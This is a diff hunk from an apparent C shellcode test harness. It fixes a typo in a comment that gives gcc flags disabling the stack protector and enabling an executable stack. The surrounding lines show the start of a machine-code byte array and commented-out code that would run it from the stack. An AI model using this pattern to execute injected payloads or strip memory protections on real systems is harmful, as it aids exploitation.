@@ -9,7 +9,7 @@ unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x48\x31\xff\x48\x89\xfa
 int main()
 {
 	// execute from stack
-	// gcc -fno-stack-protector -z execstack exec-asemblyLinux.c -o exec-asemblyLinux -w
+	// gcc -fno-stack-protector -z execstack exec-assemblyLinux.c -o exec-assemblyLinux -w
 //	int (*ret)() = (int(*)())code;
 //	ret();
 
